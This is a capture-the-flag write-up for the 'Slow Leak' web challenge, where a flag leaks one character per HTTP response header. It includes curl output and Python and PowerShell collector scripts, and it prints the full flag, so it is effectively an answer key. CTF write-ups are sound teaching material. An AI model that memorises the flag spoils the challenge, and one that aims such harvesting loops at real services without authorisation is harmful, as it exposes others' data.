# CTF Write-up: Slow Leak

> **Category:** Web Exploitation & Protocol Forensics  
> **Challenge Type:** Covert Channels / HTTP Side-Channel Leakage  

---

## Challenge Metadata

| Property | Value |
| :--- | :--- |
| **Challenge Name** | Slow Leak |
| **CTF Competition** | SecLeaf CTF |
| **Category** | Web Exploitation / Network Forensics |
| **Points** | 100 PTS |
| **Target URL** | `http://web.secleaf.xyz:8080` |
| **Flag Format** | `SecLeaf{...}` |
| **Flag** | `SecLeaf{h34d3r5_l34k_0n3_dr1p_4t_4_t1m3}` |

---

## 1. Challenge Overview

> *"Hollow Creek Water Authority keeps losing pressure on Main 07, but every display in the control room reads normal. The repair crews have left their notes in the incident log, and they all agree that something is getting out, one drop at a time. Plug in, read the log and work out what's leaking."*

* **Target URL:** `http://web.secleaf.xyz:8080`
* **Flag Format:** `SecLeaf{...}`

---

## 2. Reconnaissance & Clue Breakdown

Navigating to the web interface displays an industrial telemetry dashboard titled **"Main 07 District Control"** alongside an incident tracking log. Analyzing the maintenance timestamps reveals the exact mechanics of the vulnerability:

| Timestamp | Crew Log Note | Security Implication |
| :--- | :--- | :--- |
| **03:12** | *Pressure loss reported; visual displays read normal.* | The leak does not reside in the visible HTML body or rendered UI. |
| **04:40** | *Trouble is up on the header line.* | The data is exfiltrated inside **HTTP response headers** rather than the response payload. |
| **05:05** | *One drop every time somebody refreshes.* | Each individual `HTTP GET` request releases exactly one leaked byte/character. |
| **06:30** | *Front desk treats you as new unless you bring work order.* | Session state is tracked via a session cookie named `work_order`. Dropping it resets the leak counter. |
| **07:15** | *Drops arrive in no useful order, stamped with serial.* | Characters arrive in non-sequential order stamped with an index format: `X/40`. |

---

## 3. Technical Inspection & Protocol Analysis

Issuing an initial raw HTTP request using `curl` confirms the side-channel headers:

```bash
curl -i http://web.secleaf.xyz:8080/
```

### Raw Response Headers

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
X-Drip: S
X-Drip-Serial: 1/40
Set-Cookie: work_order=eyJkcm9wcyI6MSwic2VlZCI6MTQyMDQ1MTUwOH0...; HttpOnly; Path=/; SameSite=Lax
```

* `X-Drip`: Contains a single leaked character (`S`).
* `X-Drip-Serial`: Supplies the character's exact 1-based position and total length (`1/40`).
* `Set-Cookie`: Contains a signed JSON session token preserving the client's drop counter and sequence seed.

Repeating the request while preserving the session cookie returns a different index and character:

```bash
curl -i -b cookie.txt -c cookie.txt http://web.secleaf.xyz:8080/
```

```http
HTTP/1.1 200 OK
X-Drip: 3
X-Drip-Serial: 18/40
Set-Cookie: work_order=eyJkcm9wcyI6Miwic2VlZCI6MTIwNTE3OTI0MX0...
```

---

## 4. Exploitation & Flag Recovery

Because indices are sampled pseudo-randomly per request, an automated script must query the endpoint with a persistent session until all 40 unique character positions (`1` through `40`) have been observed.

### 4.1 Python Implementation

```python
#!/usr/bin/env python3
import requests

url = "http://web.secleaf.xyz:8080/"
session = requests.Session()

flag_chars = {}
total_chars = None

print("[*] Collecting leaked drops...")

while total_chars is None or len(flag_chars) < total_chars:
    res = session.get(url)
    drip = res.headers.get("X-Drip")
    serial = res.headers.get("X-Drip-Serial")

    if drip and serial:
        pos, total = map(int, serial.split("/"))
        total_chars = total

        if pos not in flag_chars:
            flag_chars[pos] = drip
            print(f"[+] Found char at {pos:02d}/{total}: '{drip}' (Collected {len(flag_chars)}/{total})")

flag = "".join(flag_chars[i] for i in range(1, total_chars + 1))
print(f"\n[!] Flag: {flag}")
```

### 4.2 PowerShell Implementation

```powershell
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$flagChars = @{}
$total = 0

Write-Output "Starting leak collection..."

while ($true) {
    $res = Invoke-WebRequest -Uri "http://web.secleaf.xyz:8080/" -WebSession $session -UseBasicParsing
    $drip = $res.Headers["X-Drip"]
    $serial = $res.Headers["X-Drip-Serial"]

    if ($serial) {
        $parts = $serial.Split('/')
        $pos = [int]$parts[0]
        $total = [int]$parts[1]

        if (-not $flagChars.ContainsKey($pos)) {
            $flagChars[$pos] = $drip
            Write-Output "Found char at pos $pos / $total : '$drip' (Collected $($flagChars.Count) / $total)"
        }

        if ($flagChars.Count -eq $total) {
            Write-Output "All 40 characters collected!"
            break
        }
    }
}

$flag = -join (1..$total | ForEach-Object { $flagChars[$_] })
Write-Output "`nFINAL FLAG: $flag"
```

---

## 5. Verification & Final Flag

Running the collector took approximately **40 seconds** across **65 HTTP requests**. Assembling the indexed fragments in sequential order (`1..40`) revealed the flag:

> [!IMPORTANT]
> **Final Flag:** `SecLeaf{h34d3r5_l34k_0n3_dr1p_4t_4_t1m3}`  
> **Decoded Leetspeak:** *"headers leak one drip at a time"*

---

## 6. Key Takeaways

* **Covert Channels via HTTP Headers:** Custom HTTP headers (`X-*`) can serve as data exfiltration vectors that bypass naive body-content inspection and client UI rendering.
* **Stateful Automation:** Retaining cookies via `requests.Session()` or `WebRequestSession` is critical when server-side logic enforces progressive sequence tracking.
* **Fragment Reassembly:** When streams arrive out-of-order, index metadata (`X-Drip-Serial: X/40`) enables deterministic reconstruction regardless of network jitter or randomization.
